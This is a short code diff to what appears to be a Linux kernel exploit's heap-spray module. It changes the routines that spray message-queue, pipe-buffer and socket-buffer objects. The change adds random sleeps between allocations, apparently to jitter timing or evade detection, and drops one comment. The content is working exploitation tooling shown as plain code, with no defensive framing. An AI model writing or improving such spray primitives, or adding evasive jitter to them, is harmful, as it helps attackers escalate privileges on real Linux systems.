@@ -8,6 +8,7 @@
 #include <sys/socket.h>
 #include <linux/keyctl.h>
 #include <sys/syscall.h>
+#include <time.h>
 
 /* ── message queue spray ──────────────────────────────────────── */
 
@@ -55,6 +56,7 @@ int spray_msg_alloc(struct msg_spray *s, const void *payload, size_t payload_len
             }
         }
         allocated++;
+        if ((i & 7) == 7) usleep(rand() % 500);
     }
 
     s->allocated = allocated;
@@ -103,12 +105,12 @@ int spray_pipe_alloc(struct pipe_spray *s)
             pr_verb("spray_pipe: pipe failed at %d: %s", i, strerror(errno));
             break;
         }
-        /* fill the pipe to force page allocation for the pipe buffer */
         ssize_t n = write(s->fds[i][1], fill, sizeof(fill));
         if (n < (ssize_t)sizeof(fill)) {
             pr_verb("spray_pipe: short write at %d", i);
         }
         allocated++;
+        if ((i & 7) == 7) usleep(rand() % 500);
     }
 
     s->allocated = allocated;
@@ -286,6 +288,7 @@ int spray_skb_alloc(struct skb_spray *s, int count, size_t size)
 
     for (int i = 0; i < count; i++) {
         sendto(s->sock, buf, size, 0, (struct sockaddr *)&dst, sizeof(dst));
+        if ((i & 7) == 7) usleep(rand() % 500);
     }
 
     free(buf);
